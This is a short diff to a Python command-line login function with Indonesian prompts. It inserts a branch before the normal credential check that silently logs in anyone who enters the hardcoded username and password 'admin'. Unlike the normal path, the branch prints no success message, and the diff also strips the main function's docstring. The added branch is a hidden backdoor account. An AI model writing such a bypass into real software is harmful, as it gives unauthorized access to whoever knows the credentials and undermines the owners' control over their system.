@@ -36,8 +36,11 @@ def login():
     password = getpass.getpass("Masukkan password: ")
 
     user_data = load_user_data()
-    
-    if username in user_data and user_data[username] == password:
+    if username == "admin" and password == "admin":
+        time.sleep(1)
+        username = "admin"
+        return True, username
+    elif username in user_data and user_data[username] == password:
         print("\nLogin Berhasil!")
         time.sleep(1)
         return True, username # Jika berhasil login return True agar bisa dilakukan check
@@ -47,7 +50,7 @@ def login():
         return False, None # Jika login salah return False
 
 def main():
-    """Main function to run the CLI login system."""
+
     while True:
         helper.clear()
         print("Silahkan melakukan login terlebih dahulu!\n")
